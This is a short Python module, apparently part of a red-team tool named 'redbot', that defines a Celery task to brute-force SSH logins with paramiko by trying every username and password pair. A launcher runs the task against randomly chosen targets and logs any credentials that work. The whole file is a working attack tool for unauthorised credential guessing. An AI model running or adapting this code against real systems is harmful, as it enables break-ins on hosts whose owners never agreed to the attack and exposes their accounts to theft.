import socket
from typing import List

import paramiko

from redbot.async import celery
from redbot.utils import log, random_targets


@celery.task(bind=True)
def ssh_brute_force(self, host: str, port: int = 22, users: List[str] = [], passwords: List[str] = []):
    self.update_state(state="PROGRESS", meta={'target': host})
    for user in users:
        for password in passwords:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            try:
                ssh.connect(host=host, port=port, username=user, password=password, timeout=30)
            except paramiko.AuthenticationException:
                pass
            except socket.error:
                return  # TODO: handle
            else:
                self.update_state(state="DONE", meta={'target': host, 'username': user, 'password': password})
                return
    self.update_state(state="DONE", meta={'target': host, 'username': None, 'password': None})


def push_update(data):
    if data.get('status') == 'PROGRESS':
        log('Starting SSH attack on ' + data['result']['target'])
    elif data.get('status') == 'DONE':
        log('Finished SSH attack on {}, username "{}" password "{}"'.format(data['result']['target'],
                                                                            data['result']['username'],
                                                                            data['result']['password']))


def run_brute_force(users: List[str], passwords: List[str]):
    r = []
    for target in random_targets():
        r.append(ssh_brute_force.delay(target, users=users, passwords=passwords))
    for status in r:
        status.get(on_message=push_update, propagate=False)
